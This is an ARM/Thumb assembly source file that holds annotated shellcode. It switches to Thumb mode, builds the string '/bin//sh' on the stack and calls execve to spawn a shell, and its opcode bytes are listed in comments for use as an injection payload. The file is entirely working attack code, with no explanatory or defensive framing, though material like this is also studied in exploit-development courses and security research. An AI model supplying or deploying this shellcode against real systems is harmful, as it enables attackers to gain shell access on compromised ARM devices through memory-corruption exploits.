    .section .shcode, "ax", %progbits
    .globl main
    .type main, %function
    .arm
main:
    /* e28f4001 */  add     r4, pc, #1
    /* e12fff14 */  bx      r4              /* go to thumb mode */

                    .thumb
    /* 4668     */  mov     r0, sp
    /* 380c     */  sub     r0, #12         /* r0 = sp - 12 */
    /* 4052     */  eor     r2, r2          /* r2 = NULL */
    /* 4b03     */  ldr     r3, [pc, #12]   /* r3 = "/bin" */
    /* 4c03     */  ldr     r4, [pc, #12]   /* r4 = "//sh" */
    /* 406d     */  eor     r5, r5          /* r5 = 0 */
    /* b43d     */  push    {r0, r2-r5}     /* push r5, r4, r3, r2, r0 */
    /* 4669     */  mov     r1, sp          /* r1 = [r0, NULL] */
    /* 270b     */  mov     r7, #11         /* r7 = __NR_execve */
    /* df0b     */  svc     11              /* syscall(r7, r0, r1, r2) */

    /* 2f 62 69 6e 2f 2f 73 68 */
    .byte   0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68

/* Mark the stack as not executable */
    .section .note.GNU-stack, "", %progbits
